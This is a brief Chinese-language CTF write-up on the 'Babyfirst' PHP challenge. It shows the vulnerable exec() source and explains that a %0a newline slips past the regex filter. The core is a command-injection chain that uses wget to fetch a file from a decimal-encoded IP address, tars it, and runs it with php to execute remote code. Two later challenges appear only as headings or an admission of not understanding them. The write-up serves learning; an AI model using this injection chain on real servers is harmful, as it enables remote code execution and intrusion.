1.Babyfirst

源代码:

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }

    exec("/bin/orange " . implode(" ", $args));
?>
```
可以发现过滤是基于大小写字母数字和下划线。
但是%0a可以绕过过滤,而且%0a是换行，这样就可以在exec中执行多条命令（为什么能绕过呢？）
所以最后的命令是
/bin/orange x%0a mkdir orange %0a cd orange%0a wget 846465263%0a    //846465263为ip地址的10进制
/bin/orange x%0a tar cvf aa orange%0a php aa
可以达到执行外部php文件的目的

2.BabyFirst Revenge
实在没看懂

2.nanana